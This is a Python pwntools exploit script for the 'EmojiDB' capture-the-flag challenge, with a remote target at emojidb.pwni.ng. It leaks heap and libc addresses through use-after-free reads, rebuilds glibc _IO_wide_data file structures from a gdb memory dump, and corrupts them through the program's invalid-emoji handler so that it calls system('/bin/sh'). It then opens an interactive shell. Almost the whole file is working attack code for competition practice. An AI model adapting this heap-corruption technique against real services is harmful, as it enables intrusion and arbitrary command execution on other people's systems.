#!/usr/bin/env python3
from typing import List

from pwn import *


def preexec_fn():
    os.close(2)


def preexec_fn_memtrace():
    fd = os.open('/tmp/memtrace.log', os.O_CREAT | os.O_TRUNC | os.O_WRONLY, 0o644)
    os.dup2(fd, 99, inheritable=True)
    os.close(fd)
    preexec_fn()


def mk_io():
    if args.LOCAL:
        if False:
            return process(['strace', '-f', '-o', '/tmp/strace.out', 'memtrace', '--log-fd=99', 'bin/emojidb.dbg'],
                           preexec_fn=preexec_fn_memtrace, close_fds=False)
        else:
            return process(['bin/emojidb.dbg'], preexec_fn=preexec_fn)
    else:
        return remote('emojidb.pwni.ng', 9876)
        #return remote('172.17.0.1', 9876)


emoji_add = bytes.fromhex('f09f8695')
emoji_show = bytes.fromhex('f09f9396')
emoji_delete = bytes.fromhex('f09f8693')
emoji_quit = bytes.fromhex('f09f9b91')
emoji_magic = bytes.fromhex('f09f9aa9')
emoji_which = bytes.fromhex('f09f94a2e29d93')
emoji_prompt = emoji_add + emoji_show + emoji_delete + emoji_quit + bytes.fromhex('e29d93')


def wait_for_prompt(io):
    if hasattr(io, 'skip-wait-for-prompt'):
        delattr(io, 'skip-wait-for-prompt')
        return
    return io.recvuntil(emoji_prompt)


def add(io, size, text):
    wait_for_prompt(io)
    io.send(emoji_add)
    emoji_full = bytes.fromhex('f09f88b5')
    emoji_size = bytes.fromhex('f09f938f')
    s = io.recvuntil((emoji_size, emoji_full))
    if s.endswith(emoji_full):
        return False
    io.sendline(str(size))
    s = io.recvuntil(bytes.fromhex('f09f9aab'), timeout=0.1)
    if s != b'':
        return False
    io.sendline(text)
    return True


def show(io, index, expect_missing=False):
    wait_for_prompt(io)
    io.send(emoji_show)
    io.recvuntil(emoji_which)
    io.sendline(str(index))
    if expect_missing:
        io.recvuntil(bytes.fromhex('f09f9aab'))
        return None
    info = wait_for_prompt(io)
    setattr(io, 'skip-wait-for-prompt', None)
    return info[:-len(emoji_prompt)]


def delete(io, index):
    wait_for_prompt(io)
    io.send(emoji_delete)
    io.recvuntil(emoji_which)
    io.sendline(str(index))
    emoji_ok = bytes.fromhex('f09f9aae')
    emoji_missing = bytes.fromhex('f09f9aab')
    s = io.recvuntil((emoji_ok, emoji_missing))
    return s.endswith(emoji_ok)


def magic(io):
    wait_for_prompt(io)
    io.send(emoji_magic)


def quit(io):
    wait_for_prompt(io)
    io.send(emoji_quit)


def invalid(io, utf32):
    wait_for_prompt(io)
    utf8 = utf32_to_utf8((utf32,))
    print(f'Sending {utf8} in order to get {utf32:08x}')
    io.send(utf8)
    emoji_scream = bytes.fromhex('f09f98b1')
    io.recvuntil(emoji_scream)


def random_index():
    r = randint(0, 6)
    if r == 6:
        r = randint(0, 0xffffffff)
    return r


def random_length():
    r = randint(0, 0x805)
    if r == 0x805:
        r = randint(0, 0xffffffff)
    return r


def fuzz(io):
    fuzzlog = []
    try:
        random.seed(0)
        t0 = time.time()
        while True:
            print(str(time.time() - t0))
            r = randint(0, 4)
            if r == 0:
                length = random_length()
                fuzzlog.append(f'''add(io, {length}, 'foo')''')
                add(io, length, 'foo')
            elif r == 1:
                index = random_index()
                fuzzlog.append(f'''show(io, {index})''')
                show(io, index)
            elif r == 2:
                index = random_index()
                fuzzlog.append(f'''delete(io, {index})''')
                delete(io, index)
            elif r == 3:
                fuzzlog.append(f'''magic(io)''')
                magic(io)
            elif r == 4:
                fuzzlog.append(f'''invalid(io, 0)''')
                invalid(io, 0)
    finally:
        for line in fuzzlog:
            print(line)


def test(io):
    show(io, 0, expect_missing=True)
    show(io, 1, expect_missing=True)
    magic(io)
    assert not add(io, 0, b'xxxx')
    assert not add(io, 0x801, b'xxxx')
    assert not add(io, 0x7fffffff, b'xxxx')
    assert not add(io, 0x80000000, b'xxxx')
    assert not add(io, 0x80000001, b'xxxx')
    assert not add(io, 0xfffffffe, b'xxxx')
    assert not add(io, 0xffffffff, b'xxxx')
    assert add(io, 0x800, b'xxxx')
    assert add(io, 88, b'yyyy')
    assert add(io, 99, b'zzzz')
    assert add(io, 111, b'aaaa')
    assert add(io, 222, b'bbbb')
    assert not add(io, 333, b'cccc')
    assert not delete(io, -1)
    assert not delete(io, 0)
    assert delete(io, 1)
    show(io, 1)
    assert not delete(io, 1)
    assert delete(io, 2)
    assert delete(io, 3)
    assert delete(io, 4)
    assert not delete(io, 5)
    assert not delete(io, 0x7fffffff)
    show(io, 0)
    quit(io)


def utf8_to_utf32(s: bytes) -> List[int]:
    result = []
    while len(s) > 0:
        b = '{:08b}'.format(s[0])
        s = s[1:]
        if b[0:1] == '0':
            cont_chars = 0
            codepoint = b
        elif b[0:3] == '110':
            cont_chars = 1
            codepoint = b[3:]
        elif b[0:4] == '1110':
            cont_chars = 2
            codepoint = b[4:]
        elif b[0:5] == '11110':
            cont_chars = 3
            codepoint = b[4:]
        elif b[0:6] == '111110':
            cont_chars = 4
            codepoint = b[5:]
        elif b[0:7] == '1111110':
            cont_chars = 5
            codepoint = b[6:]
        else:
            continue
        for i in range(cont_chars):
            b = '{:08b}'.format(s[0])
            s = s[1:]
            if b[0:2] != '10':
                break
            codepoint += b[2:]
        codepoint = int(codepoint, 2)
        result.append(codepoint)
    return result


def utf8_to_ptrs(s):
    ints = utf8_to_utf32(s)
    ptrs = []
    for i in range(len(ints) // 2):
        ptrs.append(ints[i] | (ints[i + 1] << 32))
    return ptrs


def utf32_to_utf8(codepoints):
    result = bytearray()
    for codepoint in codepoints:
        b = '{:b}'.format(codepoint)
        if len(b) <= 7:
            ch = '0'
            cont_chars = 0
        elif len(b) <= 11:
            ch = '110'
            cont_chars = 1
        elif len(b) <= 16:
            ch = '1110'
            cont_chars = 2
        elif len(b) <= 21:
            ch = '11110'
            cont_chars = 3
        elif len(b) <= 26:
            ch = '111110'
            cont_chars = 4
        elif len(b) <= 31:
            ch = '1111110'
            cont_chars = 5
        else:
            assert False, hex(codepoint)
        first_bits = 8 - len(ch)
        b = b.rjust(first_bits + 6 * cont_chars, '0')
        ch += b[:first_bits]
        b = b[first_bits:]
        for i in range(cont_chars):
            ch += '10' + b[:6]
            b = b[6:]
        for i in range(0, len(ch), 8):
            result.append(int(ch[i:i + 8], 2))
    return bytes(result)


def leak_heap(io):
    assert add(io, 0x8, '')
    assert add(io, 0x8, '')
    assert delete(io, 1)
    assert delete(io, 2)
    data = show(io, 2)
    ptrs = utf8_to_ptrs(data)
    print(f'leaked heap ptrs = ' + str([hex(ptr) for ptr in ptrs]))
    heap = ptrs[0] - 0x14e0
    if heap & 0xfff == 0:
        return heap
    return None


def leak_libc(io):
    assert add(io, 0x800, '')
    assert add(io, 0x800, '')
    assert delete(io, 1)
    data = show(io, 1)
    assert delete(io, 2)
    ptrs = utf8_to_ptrs(data)
    print(f'leaked libc ptrs = ' + str([hex(ptr) for ptr in ptrs]))
    libc = ptrs[0] - 0x3ebca0
    if libc & 0xfff == 0:
        return libc
    return None


def array(heap, libc):
    # (gdb) x/100a (char*)&_IO_wide_data_2+296
    template = '''
0x7f2fa55b58a8 <_IO_wide_data_2+296>:   0x0     0x7f2fa55b1d60 <_IO_wfile_jumps>
0x7f2fa55b58b8: 0x0     0x7f2fa55b59e8 <_IO_wide_data_1+296>
0x7f2fa55b58c8 <_IO_wide_data_1+8>:     0x7f2fa55b59e8 <_IO_wide_data_1+296>    0x7f2fa55b59e8 <_IO_wide_data_1+296>
0x7f2fa55b58d8 <_IO_wide_data_1+24>:    0x7f2fa55b59e8 <_IO_wide_data_1+296>    0x7f2fa55b59e8 <_IO_wide_data_1+296>
0x7f2fa55b58e8 <_IO_wide_data_1+40>:    0x7f2fa55b59e8 <_IO_wide_data_1+296>    0x7f2fa55b59e8 <_IO_wide_data_1+296>
0x7f2fa55b58f8 <_IO_wide_data_1+56>:    0x7f2fa55b59ec <_IO_wide_data_1+300>    0x0
0x7f2fa55b5908 <_IO_wide_data_1+72>:    0x0     0x0
0x7f2fa55b5918 <_IO_wide_data_1+88>:    0x0     0x0
0x7f2fa55b5928 <_IO_wide_data_1+104>:   0x0     0x7f2fa5250db0 <do_out>
0x7f2fa55b5938 <_IO_wide_data_1+120>:   0x7f2fa5250cd0 <do_unshift>     0x7f2fa5250be0 <do_in>
0x7f2fa55b5948 <_IO_wide_data_1+136>:   0x7f2fa5250ba0 <do_encoding>    0x7f2fa5250bc0 <do_always_noconv>
0x7f2fa55b5958 <_IO_wide_data_1+152>:   0x7f2fa5250eb0 <do_length>      0x7f2fa5250bd0 <do_max_length>
0x7f2fa55b5968 <_IO_wide_data_1+168>:   0x1     0x55cc97487320
0x7f2fa55b5978 <_IO_wide_data_1+184>:   0x0     0x0
0x7f2fa55b5988 <_IO_wide_data_1+200>:   0x1     0x1
0x7f2fa55b5998 <_IO_wide_data_1+216>:   0x7f2fa55b5918 <_IO_wide_data_1+88>     0x0
0x7f2fa55b59a8 <_IO_wide_data_1+232>:   0x1     0x55cc97487400
0x7f2fa55b59b8 <_IO_wide_data_1+248>:   0x7ffe4149b9d3  0x7ffe4149b9e0
0x7f2fa55b59c8 <_IO_wide_data_1+264>:   0x1f00000009    0x1
0x7f2fa55b59d8 <_IO_wide_data_1+280>:   0x7f2fa55b5918 <_IO_wide_data_1+88>     0x0
0x7f2fa55b59e8 <_IO_wide_data_1+296>:   0x2753  0x7f2fa55b1d60 <_IO_wfile_jumps>
0x7f2fa55b59f8: 0x0     0xfbad208b
0x7f2fa55b5a08 <_IO_2_1_stdin_+8>:      0x7f2fa55b5a83 <_IO_2_1_stdin_+131>     0x7f2fa55b5a83 <_IO_2_1_stdin_+131>
0x7f2fa55b5a18 <_IO_2_1_stdin_+24>:     0x7f2fa55b5a83 <_IO_2_1_stdin_+131>     0x7f2fa55b5a83 <_IO_2_1_stdin_+131>
0x7f2fa55b5a28 <_IO_2_1_stdin_+40>:     0x7f2fa55b5a83 <_IO_2_1_stdin_+131>     0x7f2fa55b5a83 <_IO_2_1_stdin_+131>
0x7f2fa55b5a38 <_IO_2_1_stdin_+56>:     0x7f2fa55b5a83 <_IO_2_1_stdin_+131>     0x7f2fa55b5a84 <_IO_2_1_stdin_+132>
0x7f2fa55b5a48 <_IO_2_1_stdin_+72>:     0x0     0x0
0x7f2fa55b5a58 <_IO_2_1_stdin_+88>:     0x0     0x0
0x7f2fa55b5a68 <_IO_2_1_stdin_+104>:    0x0     0x1800000000
0x7f2fa55b5a78 <_IO_2_1_stdin_+120>:    0xffffffffffffffff      0x0
0x7f2fa55b5a88 <_IO_2_1_stdin_+136>:    0x7f2fa55b78d0 <_IO_stdfile_0_lock>     0xffffffffffffffff
0x7f2fa55b5a98 <_IO_2_1_stdin_+152>:    0x7f2fa55b5b48 <_IO_wide_data_0+104>    0x7f2fa55b5ae0 <_IO_wide_data_0>
0x7f2fa55b5aa8 <_IO_2_1_stdin_+168>:    0x0     0x0
0x7f2fa55b5ab8 <_IO_2_1_stdin_+184>:    0x0     0x1
0x7f2fa55b5ac8 <_IO_2_1_stdin_+200>:    0x0     0x0
0x7f2fa55b5ad8 <_IO_2_1_stdin_+216>:    0x7f2fa55b1d60 <_IO_wfile_jumps>        0x7f2fa55b5c08 <_IO_wide_data_0+296>
0x7f2fa55b5ae8 <_IO_wide_data_0+8>:     0x7f2fa55b5c08 <_IO_wide_data_0+296>    0x7f2fa55b5c08 <_IO_wide_data_0+296>
0x7f2fa55b5af8 <_IO_wide_data_0+24>:    0x7f2fa55b5c08 <_IO_wide_data_0+296>    0x7f2fa55b5c08 <_IO_wide_data_0+296>
0x7f2fa55b5b08 <_IO_wide_data_0+40>:    0x7f2fa55b5c08 <_IO_wide_data_0+296>    0x7f2fa55b5c08 <_IO_wide_data_0+296>
0x7f2fa55b5b18 <_IO_wide_data_0+56>:    0x7f2fa55b5c0c <_IO_wide_data_0+300>    0x0
0x7f2fa55b5b28 <_IO_wide_data_0+72>:    0x0     0x0
0x7f2fa55b5b38 <_IO_wide_data_0+88>:    0x0     0x0
0x7f2fa55b5b48 <_IO_wide_data_0+104>:   0x0     0x7f2fa5250db0 <do_out>
0x7f2fa55b5b58 <_IO_wide_data_0+120>:   0x7f2fa5250cd0 <do_unshift>     0x7f2fa5250be0 <do_in>
0x7f2fa55b5b68 <_IO_wide_data_0+136>:   0x7f2fa5250ba0 <do_encoding>    0x7f2fa5250bc0 <do_always_noconv>
0x7f2fa55b5b78 <_IO_wide_data_0+152>:   0x7f2fa5250eb0 <do_length>      0x7f2fa5250bd0 <do_max_length>
0x7f2fa55b5b88 <_IO_wide_data_0+168>:   0x1     0x55cc97487320
0x7f2fa55b5b98 <_IO_wide_data_0+184>:   0x0     0x0
0x7f2fa55b5ba8 <_IO_wide_data_0+200>:   0x1     0x1
0x7f2fa55b5bb8 <_IO_wide_data_0+216>:   0x7f2fa55b5b38 <_IO_wide_data_0+88>     0x0
'''
    values = []
    for line in template.split('\n'):
        line = line.strip()
        if line == '':
            continue
        value_r = r'(0x[0-9a-f]+)(?: <[^>]+>)?'
        m = re.match(r'^' + value_r + r':\s+' + value_r + r'\s+' + value_r + r'$', line)
        assert m is not None, line
        _, value1, value2 = m.groups()
        values.append(int(value1, 16))
        values.append(int(value2, 16))
    # 55cc95db2000-55cc95db4000 r-xp 00000000 fd:00 26235465                   /home/spujb/ctf/EmojiDB/bin/emojidb.dbg
    # 55cc95fb3000-55cc95fb4000 r--p 00001000 fd:00 26235465                   /home/spujb/ctf/EmojiDB/bin/emojidb.dbg
    # 55cc95fb4000-55cc95fb5000 rw-p 00002000 fd:00 26235465                   /home/spujb/ctf/EmojiDB/bin/emojidb.dbg
    # 55cc97486000-55cc974a7000 rw-p 00000000 00:00 0                          [heap]
    # 7f2fa4eec000-7f2fa51ca000 r--p 00000000 fd:00 5901158                    /usr/lib/locale/locale-archive
    # 7f2fa51ca000-7f2fa53b1000 r-xp 00000000 fd:00 7348356                    /lib/x86_64-linux-gnu/libc-2.27.so
    # 7f2fa53b1000-7f2fa55b1000 ---p 001e7000 fd:00 7348356                    /lib/x86_64-linux-gnu/libc-2.27.so
    # 7f2fa55b1000-7f2fa55b5000 r--p 001e7000 fd:00 7348356                    /lib/x86_64-linux-gnu/libc-2.27.so
    # 7f2fa55b5000-7f2fa55b7000 rw-p 001eb000 fd:00 7348356                    /lib/x86_64-linux-gnu/libc-2.27.so
    # 7f2fa55b7000-7f2fa55bb000 rw-p 00000000 00:00 0
    # 7f2fa55bb000-7f2fa55e2000 r-xp 00000000 fd:00 7348338                    /lib/x86_64-linux-gnu/ld-2.27.so
    # 7f2fa57d3000-7f2fa57da000 r--s 00000000 fd:00 7865566                    /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
    # 7f2fa57da000-7f2fa57dc000 rw-p 00000000 00:00 0
    # 7f2fa57e2000-7f2fa57e3000 r--p 00027000 fd:00 7348338                    /lib/x86_64-linux-gnu/ld-2.27.so
    # 7f2fa57e3000-7f2fa57e4000 rw-p 00028000 fd:00 7348338                    /lib/x86_64-linux-gnu/ld-2.27.so
    # 7f2fa57e4000-7f2fa57e5000 rw-p 00000000 00:00 0
    # 7ffe41485000-7ffe414a6000 rw-p 00000000 00:00 0                          [stack]
    # 7ffe415cd000-7ffe415d0000 r--p 00000000 00:00 0                          [vvar]
    # 7ffe415d0000-7ffe415d1000 r-xp 00000000 00:00 0                          [vdso]
    # ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
    template_heap_start = 0x55cc97486000
    template_heap_end = 0x55cc974a7000
    template_libc_start = 0x7f2fa51ca000
    template_libc_end = 0x7f2fa55b7000
    rebased_values = []
    for value in values:
        if template_heap_start <= value < template_heap_end:
            rebased_values.append(heap + (value - template_heap_start))
        elif template_libc_start <= value < template_libc_end:
            rebased_values.append(libc + (value - template_libc_start))
        else:
            rebased_values.append(value)
    return rebased_values


def boom0(io, heap, libc):
    add(io, 1, '')
    add(io, 1, '')
    add(io, 1, '')
    add(io, 1, '')
    add(io, 1, '')

    if False:
        time.sleep(0.5)
        gdb.attach(io, gdbscript='''
set pagination off
p signal(14, 1)
#b *(main-0x9D0+0xB02)
b wfileops.c:1003
commands
  p/x p
  p/x *p
  p/x *s
  p *p == *s
  c
end
c
''')
        time.sleep(0.5)

    arr = array(heap, libc)[1:]
    # call 8(%rax) jumps to arr[16]
    # rdi already points to arr[15]
    arr[15] = struct.unpack('<Q', b'/bin/sh\0')[0]
    arr[16] = libc + 0x4f440  # system
    dwords = [w for q in arr for w in (q & 0xffffffff, q >> 32)]
    for i, ch in enumerate(dwords):
        print(f'word #{i}')
        if ch == 10:
            ch = 0x0a0a0a0a
        invalid(io, ch)
        if i == 32:
            io.interactive()
    show(io, 1)


# test(io)
# fuzz(io)
# magic(io)
for _ in range(16):
    io = mk_io()
    heap = leak_heap(io)
    libc = leak_libc(io)
    if heap is not None and libc is not None:
        break
    io.close()
else:
    raise Exception('Could not leak heap and libc')
print(f'heap = 0x{heap:016x}')
print(f'libc = 0x{libc:016x}')
boom0(io, heap, libc)
# full_boom(io)

io.interactive()
